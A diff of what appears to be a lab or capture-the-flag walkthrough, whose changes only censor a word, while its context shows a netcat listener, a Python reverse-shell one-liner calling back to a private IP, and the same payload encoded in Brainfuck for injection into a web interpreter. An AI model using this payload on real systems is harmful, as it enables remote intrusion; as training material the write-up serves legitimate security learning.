@@ -59,14 +59,14 @@ PORT   STATE SERVICE
 + the code form strikes me as interesting
 
   
-+ browsing the website manually it appears we can execute brainfuck code in the interpreter
++ browsing the website manually it appears we can execute brainf*ck code in the interpreter
 
   
 + what if we manually encoded a python payload to get a reverse shell?
 
 
 
-# We obtain a reverse shell using a manual exploit against the brainfuck python interpreter
+# We obtain a reverse shell using a manual exploit against the brainf*ck python interpreter
 
 
 `nc -nlvp 8000`
@@ -78,7 +78,7 @@ PORT   STATE SERVICE
 `import os,pty,socket;s=socket.socket();s.connect(("192.168.136.132",8000));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")`
 
 
-+ use dcode to encode it into brainfuck
++ use dcode to encode it into brainf*ck
 
 ```
 ++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++.++++.+++.-.+++.++.<<++.>>-----.++++.<<++++++++++++.>>---.++++.+++++.<<.>>------.----.------------.++++++++.------.+++++++++++++++.<-----------.>-.<++.>.----.------------.++++++++.------.+++++++++++++++.<<++.>>-.----.------------.++++++++.------.+++++++++++++++.<<------.+.>--.>-.<<+++++.>>----------------.++++++++++++.-..---------.--.+++++++++++++++++.<<------..------.>----------.++++++++.-------.----.+++.+++++.++.----------.+++.++.+++.--------.+++.++.-.<.>------.++++++++++++.--------...<+++++++..>+++++++++++.>-------------------------.++++++++++++++++++++.++++.<<+++++.>>---------------.+++++++++++++++++.-----.<<++++.----------.>>+++.<<++++++.>>-------------.+++.+++.-------.+++++++++.+.<<------.+.+++.>>---------.<<---.>>.+++++++++.+++.<<---------.>>------------.<<.>>+++.+++++.<<++++++++.++++++++.----.+++++.-----.++++++.---------.>>-----------------.<.>+++++++++++++++++++.++++.+++++.<<+++++.>>------.---.---------------.++++++++++++++++++++++.---------.<<------.------.>>+++++.-----------.<<.+++++++.
